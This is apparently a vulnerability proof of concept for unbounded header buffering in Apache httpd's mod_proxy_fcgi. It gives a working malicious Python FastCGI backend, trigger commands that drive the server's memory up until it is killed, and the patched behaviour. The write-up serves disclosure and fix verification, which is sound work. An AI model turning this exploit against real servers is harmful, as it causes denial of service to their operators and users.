# PoC 059 - Unbounded FastCGI Header Buffering

A FastCGI backend that sends STDOUT bytes without ever emitting a header
terminator forces `mod_proxy_fcgi` to retain every pre-header chunk in the
request pool, growing per-request memory without limit.

## Setup

Vulnerable httpd 2.4.66 with `mod_proxy` and `mod_proxy_fcgi` loaded.

`conf/httpd.conf`:

```
ServerName 127.0.0.1
Listen 127.0.0.1:8080
LoadModule proxy_module        modules/mod_proxy.so
LoadModule proxy_fcgi_module   modules/mod_proxy_fcgi.so
ErrorLog logs/error_log
LogLevel proxy_fcgi:debug
DocumentRoot /tmp/htdocs

ProxyPass        /fcgi  fcgi://127.0.0.1:9000/
ProxyPassReverse /fcgi  fcgi://127.0.0.1:9000/
```

A malicious FastCGI listener `fcgi_evil.py` that accepts any FCGI request and
streams STDOUT records without ever writing `\r\n\r\n`:

```python
# /tmp/fcgi_evil.py
import socket, struct, time
FCGI_VER = 1
FCGI_STDOUT = 6
FCGI_END_REQUEST = 3

def pack(typ, rid, data=b""):
    pad = (-len(data)) & 7
    return struct.pack("!BBHHBB", FCGI_VER, typ, rid, len(data), pad, 0) + data + b"\x00"*pad

s = socket.socket()
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
s.bind(("127.0.0.1", 9000)); s.listen(1)
print("evil fcgi waiting on 9000")
while True:
    c, _ = s.accept()
    rid = 1
    chunk = b"X" * 8000          # no CRLFCRLF, ever
    sent = 0
    try:
        while True:
            c.sendall(pack(FCGI_STDOUT, rid, chunk))
            sent += len(chunk)
            if sent % (1024*1024) == 0:
                print("sent", sent//1024, "KiB")
            time.sleep(0.005)
    except (BrokenPipeError, ConnectionResetError):
        c.close()
```

## Trigger

```
mkdir -p /tmp/htdocs && python3 /tmp/fcgi_evil.py &
httpd -X -f $PWD/conf/httpd.conf &
HTTPD_PID=$!

# In another shell, watch RSS while the request runs:
( while true; do ps -o rss= -p $HTTPD_PID; sleep 1; done ) &

curl -sS http://127.0.0.1:8080/fcgi/x >/dev/null
```

## Observed effect

The httpd worker's resident set keeps growing in lock-step with the bytes
emitted by `fcgi_evil.py`. The request pool is never released because
`handle_headers()` never finds the terminator, so each STDOUT bucket is
`apr_bucket_setaside()` into `setaside_pool` with no cumulative cap. Memory
grows until the worker is OOM-killed or the connection is torn down. With the
patch applied, `error_log` instead shows `APLOGNO(10501) "FastCGI response
headers exceeded 8192 bytes"` and the request fails fast with `APR_ENOSPC`.
